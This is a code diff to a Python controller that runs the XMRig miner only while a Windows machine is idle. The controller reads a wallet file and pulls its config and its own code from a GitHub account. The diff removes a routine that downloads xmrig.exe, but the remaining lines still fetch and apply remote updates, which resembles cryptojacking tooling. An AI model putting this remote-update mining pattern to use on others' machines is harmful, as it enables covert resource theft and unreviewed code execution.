@@ -29,7 +29,6 @@ WALLET_FILE = os.path.join(BASE_DIR, "wallet.txt")
 GITHUB_CONFIG_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/config_high.json"
 GITHUB_CONTROLLER_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/controller.py"
 GITHUB_DELETE_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/delete.txt"
-GITHUB_XMRIG_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/xmrig.exe"
 
 GITHUB_UPDATE_INTERVAL = 60  # 
 _last_update = 0
@@ -89,27 +88,6 @@ def load_wallet():
     except Exception:
         log("[ERROR] wallet.txt missing or unreadable")
         return None
-      
-def ensure_xmrig_exists():
-    if os.path.exists(XM_EXE) and os.path.getsize(XM_EXE) > 500000:  # sanity check (~500 KB+)
-        return True
-
-    log("[MISSING] xmrig.exe not found — downloading fresh copy...")
-
-    try:
-        r = requests.get(GITHUB_XMRIG_URL, timeout=20)
-        if r.status_code == 200:
-            with open(XM_EXE, "wb") as f:
-                f.write(r.content)
-            log("[DOWNLOAD] xmrig.exe downloaded successfully")
-            return True
-        else:
-            log(f"[ERROR] Failed to download xmrig.exe — HTTP {r.status_code}")
-            return False
-
-    except Exception as e:
-        log(f"[ERROR] Download exception: {e}")
-        return False
 
 # ============================================================
 # GITHUB UPDATER
@@ -270,7 +248,7 @@ def main():
     xmrig_mode = "off"
 
     log("Controller started (Idle-only mining, Windows version)")
-    ensure_xmrig_exists()
+
     # 
     if pull_github_updates():
         log("[RESTART] Updated config, restarting XMRig")
@@ -284,7 +262,6 @@ def main():
 
         # Start when idle
         if idle_state and xmrig_mode == "off":
-            ensure_xmrig_exists()
             xmrig_proc = start_xmrig()
             xmrig_mode = "on"
             log("[XMRIG] Started (IDLE mode HIGH)")
